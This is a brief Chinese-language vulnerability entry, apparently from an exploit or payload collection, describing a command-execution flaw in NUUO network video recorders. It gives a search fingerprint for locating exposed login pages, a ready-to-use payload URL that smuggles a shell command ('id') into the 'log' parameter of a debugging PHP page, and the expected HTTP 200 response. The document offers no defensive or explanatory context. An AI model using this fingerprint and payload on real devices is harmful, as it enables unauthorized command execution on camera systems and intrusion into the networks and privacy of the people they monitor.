# NUUO摄像头存在命令执行漏洞

NUUO ｜ 命令执行 ｜ —
- **指纹**：`title="Network Video Recorder Login"`

**Payload**
```
[http://ip:port/__debugging_center_utils___.php?log=;id](http://ip:port/__debugging_center_utils___.php?log=;id)
```
- **响应特征**：200